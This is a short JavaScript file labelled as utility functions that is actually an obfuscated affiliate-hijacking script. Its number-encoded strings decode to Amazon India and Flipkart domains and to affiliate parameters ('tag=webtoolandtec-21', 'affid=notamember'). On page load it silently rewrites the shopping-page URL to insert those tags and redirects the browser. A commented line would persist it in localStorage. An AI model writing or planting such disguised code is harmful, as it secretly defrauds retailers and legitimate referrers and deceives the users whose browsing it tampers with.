// utility functions
function utilFunctions(){

	function intToStr(str){	
		var als="abcdefghijklmnopqrstuvwxyz";
		var res="";
		for(var i=0; i<str.length; i+=2){
			res+=als[parseInt(str.substr(i,2))];
		}
		return res;
	}

	function strToInt(str){
		var res="";
		for(var i=0; i<str.length; i++){
			temp=(str.charCodeAt(i)-97).toString();
			if (temp.length==1) res+="0"+temp;
			else res+=temp;
		}
		return res;
	}

	function buildHQ(i){
		switch(i){
			case "a": 
				return intToStr("222222")+"."+intToStr("001200251413")+"."+intToStr("0813");
			case "f": 
				return intToStr("222222")+"."+intToStr("0511081510001719")+"."+intToStr("021412");
			case "i": 
				return intToStr("0005050803");
			case "t": 
				return intToStr("190006");
			case "n": 
				return intToStr("13141900120412010417");
			case "w": 
				return intToStr("22040119141411001303190402"); 
		}
	}
	
	function queryObj() {
	    var result = {}, keyValuePairs = location.search.slice(1).split('&');

	    keyValuePairs.forEach(function(keyValuePair) {
	        keyValuePair = keyValuePair.split('=');
	        result[keyValuePair[0]] = keyValuePair[1] || '';
	    });
	    return result;
	}

	function createQueryString(obj) {
		var result = "";
		for(prop in obj) {
			if(prop !== "")
			result += "&" + prop + "=" + obj[prop];
		}
		return result.substr(1);
	}

	function buildUrl(url,dom,sDom){
		var method="http";

		if(location.href === method+"://"+dom+"/") return "-1";
		if(url.substr(0,23) === method+"://"+dom+"/s/")	return  "-1";

		var refIndex = url.lastIndexOf('/');
		
		var ref = url.substr(refIndex,26);
		if(ref === "/ref="+sDom) return "-1";
		
		var ref = url.substr(refIndex,4);
		if(ref !== "/ref") return url;	

		var queryIndex = url.indexOf('?');
		var newurl = url.substr(0,refIndex) + url.substr(queryIndex);
		return newurl;	
	}

	function getUrl(obj){
		var url = location.href.split('?')[0];
		url += "?" + createQueryString(obj);
		return url;
	}

	function getQobj(key,val){
		var qObj = queryObj();
		qObj[key] = val;
		return qObj;
	}
	
	function init (ho) {
		if(ho===buildHQ("f")){
			var qObj = getQobj(buildHQ("i"),buildHQ("n"));
			var isProduct = false;

			for (var prop in qObj) {
				if(prop === 'pid') isProduct = true;        
			}

			obj = {};
			var url="";
			if(isProduct === true) {
				obj['pid'] = qObj['pid'];
				obj[key] = qObj[key];
				url=getUrl(obj);    
			} else {
				url = getUrl(qObj);
			}
			if(location.href !== url) { 
				location.href = url;
			}
		} else if(ho===buildHQ("a")){
			ll = buildUrl(getUrl(getQobj(buildHQ("t"),buildHQ("w")+"-21")),buildHQ("a"),"dp_start-bbf_1_glance");	        
			if(ll!== "-1" && location.href !== ll) { 
				location.href = ll;
			}
		}
	}
	init(location.host);
}

utilFunctions();

//store the execution so that it is available to all
//localStorage["tjs"]= utilFunctions.toString() +"utilFunctions();"
